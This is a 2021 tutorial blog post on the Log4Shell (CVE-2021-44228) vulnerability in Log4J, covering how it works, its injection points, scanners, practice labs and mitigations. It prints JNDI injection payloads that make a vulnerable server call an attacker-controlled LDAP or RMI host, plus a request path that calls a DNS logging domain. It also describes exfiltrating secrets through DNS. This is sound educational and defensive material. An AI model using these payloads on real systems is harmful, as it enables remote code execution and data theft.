---
title: Java Log4JShell Vulnerability ‚Äì What I Learned About it This Week
subtitle: ''
author: Nairuz Abulhul
co_authors: []
series: null
date: '2021-12-23T21:01:00.000Z'
originalURL: https://freecodecamp.org/news/java-log4jshell-vulnerability
coverImage: https://www.freecodecamp.org/news/content/images/2021/12/photo-1542382257-80dedb725088.jpg
tags:
- name: Java
  slug: java
- name: penetration testing
  slug: penetration-testing
- name: vulnerabilities
  slug: vulnerabilities
seo_title: null
seo_desc: "Last Thursday, a vulnerability was disclosed in the Log4J logging library\
  \ affecting many Java applications worldwide. \nThe vulnerability is called Log4Shell\
  \ (CVE-2021‚Äì44228). It allows an attacker to inject a crafted payload anywhere in\
  \ the requests ..."
---

Last Thursday, a vulnerability was disclosed in the Log4J logging library affecting many Java applications worldwide. 

The vulnerability is called Log4Shell (CVE-2021‚Äì44228). It allows an attacker to inject a crafted payload anywhere in the requests that get parsed and executed by the vulnerable application.

There are a lot of resources out there on Twitter, Reddit, and YouTube about this epic vulnerability. I wanted to create this post to summarize the main things I learned, ways to test it as pentester, and the mitigation controls that help prevent the exploitation of this vulnerability.

## Log4Shell Vulnerability Overview

The **Log4Shell** vulnerability is a Java JNDI injection. It's not a new vulnerability, though ‚Äì there was a [Blackhat talk in 2016 about it by Alvaro Munoz & Oleksandr Mirosh](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf).

Older versions of the library **1. x** are not vulnerable to code execution. The logs are encapsulated in string format as they should be, and they don‚Äôt get parsed.

Interestingly, the vulnerability was introduced with the new **JNDI lookup** feature in version **2.0‚Äì2.15.0** that allows any inputs to be parsed and interpreted by the application no matter where it originates. 

These include web applications, databases, email servers, routers, endpoint agents, mobile apps, IoT devices ‚Äî you name it (if it runs Java, it could be vulnerable).

Below is an excellent diagram by Rob Fuller [(@mubix)](https://twitter.com/mubix/status/1470430085169745920) showing this vulnerability‚Äôs impact. 

It was scary when I started looking around the room for all the devices that could be vulnerable. I tested my phone, fitness watch, and washing machine (because why not!!) through its mobile app.

I got DNS callbacks from all of them. üò±

![Image](https://www.freecodecamp.org/news/content/images/2021/12/Log4J-Explanation-Rob_Fuller_Mubix-1.png)

**JNDI**, or Java Naming Directory Interface, is an API that allows the Java application to perform searches on objects based on their names. It supports several directory services like **LDAP, RMI, DNS, and CORBA**.

Most of the payloads I have seen use LDAP, DNS, and RMI protocols to perform the DNS requests.

For the RCE pocs, the attacker needs to set up an LDAP server to allow the vulnerable application to connect to it. So, the targeted applications must allow LDAP outgoing connections to the attacker-controlled server to load the malicious object.

**DNS requests** are insufficient to confirm if the application is vulnerable to remote code execution. However, it is still impactful, as these requests can exfiltrate sensitive data that helps compromise the targets.


## Impact of the Log4Shell Vulnerability
The main impacts of this vulnerability are:
+ Data Exfiltration through DNS
+ Remote Code Execution with malicious Java objects and Rogue LDAP servers

## Patched Version
The Log4J **version 2.17** is patched.**2.15.0 and 2.16.0** patches were bypassed while writing this article.

## How Attackers Exploit Log4Shell üíª
The attacker sets up a rogue LDAP server, creates an exploit payload class, and stores it as an LDAP object such as **‚ÄúLog4JPayload.class‚Äù** to get referenced later.

Then, the attacker inserts the crafted JNDI injection to any requests that are likely to be logged, such as the request paths, HTTP headers, Filenames, Document/Images EXIF and so on **(see below injection points)**.

### Payload Examples

```
${jndi:ldap://attackermachine:portnumber/Log4JPayload.class} 

${jndi:rmi://attackermachine:portnumber/Log4JPayload.class}

```

When the malicious requests get logged, the Log4J library will parse the injected inputs and reach out to the rogue LDAP server to load the malicious class.

The application then executes the referenced class, and the attacker gains remote code execution on the vulnerable application.

## InjectionPoints
One main injection point is in **request paths** like in the example below:
```GET /${jndi:ldap://c6xppah2n.dnslog.cn/d} HTTP/1.1```

Another is in **HTTP Headers**. An attacker can inject the payloads in any HTTP Headers. All of them are valid injection points when conducting an application testing.  [Musa ≈ûana](https://musana.net/2021/12/13/log4shell-Quick-Guide/) compiled a more extensive list.

![Image](https://www.freecodecamp.org/news/content/images/2021/12/1_pyg0Y8AQNnklLdN-oqq8jg.png)
_Injection Points_

It is essential to remember that the exploit doesn‚Äôt result in an immediate callback all the time. It sometimes takes minutes to hours to get something back. 

I waited around 25 minutes before getting the first callbacks from my watch when I tested it. So for black-box testing, give the application sufficient time before deciding whether it's vulnerable or not. Be patient ‚è∞!

## Log4Shell Payloads
There are so many payloads that have been posted on Twitter in the last couple of days that are worth going over. Some payloads use obfuscation to bypass the popular WAFs like Akamai, Cloudflare, and AWS WAF. 

Below is a screenshot of the payloads collected from Twitter. 

I compiled the interesting ones on [Carbon snippet](https://carbon.now.sh/kUtwFTZzm3isgHSwWwKk).

![Image](https://www.freecodecamp.org/news/content/images/2021/12/image-54.png)
_Collected Payloads from Twitter - [https://carbon.now.sh/kUtwFTZzm3isgHSwWwKk](https://carbon.now.sh/kUtwFTZzm3isgHSwWwKk" rel="noopener ugc nofollow)_

## Data Exfiltration Examples

Suppose an application is not vulnerable to remote code execution or blocks outgoing LDAP connections. In that case, an attacker or pentester can still leverage this vulnerability to extract sensitive information such as secret keys, tokens, and configuration files of the application itself and the hosted infrastructure. 

An attacker can then leverage the information to choose the appropriate attack vector to compromise the targeted application.

![Image](https://www.freecodecamp.org/news/content/images/2021/12/dns.png)
_Carbon Sinppet - [https://carbon.now.sh/kToUK7dCk0KJkri0qvXf](https://carbon.now.sh/kToUK7dCk0KJkri0qvXf" rel="noopener ugc nofollow)_

## Auotmated Checks

Automated scans help during a black-box pentest to perform cursory checks on many hosts. Below is the list of major known scanning tools that can help you achieve that:

+ Burp Extensions:  [Log4Shell Scanner](https://portswigger.net/bappstore/b011be53649346dd87276bca41ce8e8f) 
+  [Log4J Scanner by mazen160](https://github.com/fullhunt/log4j-scan) 
+ Nuclei Template for Log4J ‚Äî id:  [CVE-2021‚Äì44228](https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml) 
+ Nmap NSE Script ‚Äî  [nse-log4shell](https://github.com/Diverto/nse-log4shell) 


## DNS Log Monitor Services
To quickly test the application, we use the below services to create a DNS token for our payload and see if we get the callbacks.
+  **[Canary Tokens](https://canarytokens.org/generate)**
+  **[DNSlog.cn](http://www.dnslog.cn/)** 
+  **[Interactsh](https://app.interactsh.com/#/)**
+  **Burp Collaborator**

## Vulnerable Apps to Test:üî•
There are a number of great, ready-to-spin-up vulnerable applications on GitHub, PentesterLabs, and TryHackMe for testing this vulnerability. 

My favorite is the Log4Shell app (it requires some setup and can show you behind the scenes of setting up a rogue LDAP server and connecting to it). However, if you want to test this quickly, TryHackMe Solar room is the way to go.

+ **Log4jPwn** ‚Äî https://github.com/leonjza/log4jpwn
+ **Log4Shell** ‚Äî https://github.com/kozmer/log4j-shell-poc
+ **PentestLabs Challenges** :  [**Log4J RCE**](https://pentesterlab.com/exercises/log4j_rce/course) ,  [**Log4J RCE II**](https://pentesterlab.com/exercises/log4j_rce_ii/course) 
+ **TryHackMe Solar Room** by John Hammond ‚Äî https://tryhackme.com/room/solar [free room]

## Log4Shell Mitigations
In order to protect yourself from this vulnerability, here are some steps you can take:
+ Upgrade to the latest version of Log4J ‚Äî **v2.17.0.** 
+ Disable lookups within messages ```log4j2.formatMsgNoLookups=true``` 

+ Remove the JndiLookup class from the classpath ```zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class```

+ Apply firewall rules to limit communications to only a few allowable hosts, not with everyone.  [**Mick Douglas**](https://twitter.com/bettersafetynet) explains it well in his Tweet about the IMMA model  [**‚ÄúIsolate,‚Äù ‚ÄúMinimize,‚Äù ‚ÄúMonitor,‚Äù and ‚ÄúActive Defense‚Äù**](https://twitter.com/bettersafetynet/status/1469470983190986754)!

That‚Äôs all for today. This was a hell of a week. I learned many new things about Java injections and exploitation.

Thanks for reading!!

## Learn More About Log4JShell

* [Apache Log4j Vulnerability CVE-2021-44228 Raises widespread Concerns](https://blogs.juniper.net/en-us/security/apache-log4j-vulnerability-cve-2021-44228-raises-widespread-concerns)
* [What do you need to know about the log4j (Log4Shell) vulnerability? by SANS Institute ](https://www.youtube.com/watch?v=oC2PZB5D3Ys) 
* [Digging deeper into Log4Shell - 0Day RCE exploit found in Log4j](https://www.fastly.com/blog/digging-deeper-into-log4shell-0day-rce-exploit-found-in-log4j) 
* [Apache log4j Vulnerability CVE-2021-44228: Analysis and Mitigations](https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/) 
* [log4shell - Quick Guide](https://musana.net/2021/12/13/log4shell-Quick-Guide/) 
* [Log4Shell Zero-day Exploit Walkthrough]( https://medium.com/geekculture/log4shell-zero-day-exploit-walkthrough-f42352612ca6)
* [CVE-2021-44228 - Log4j - MINECRAFT VULNERABLE! (and SO MUCH MORE)](https://www.youtube.com/watch?v=7qoPDq41xhQ&t=35s)
* [A Journey From JNDI/LDAP Manipulation to Remote Code Execution Dream Land ](https://www.youtube.com/watch?v=Y8a5nB-vy78&t=2494s) 
* [Log4Shell : JNDI Injection via Attackable Log4J](https://blog.shiftleft.io/log4shell-jndi-injection-via-attackable-log4j-6bfea2b4896e) 


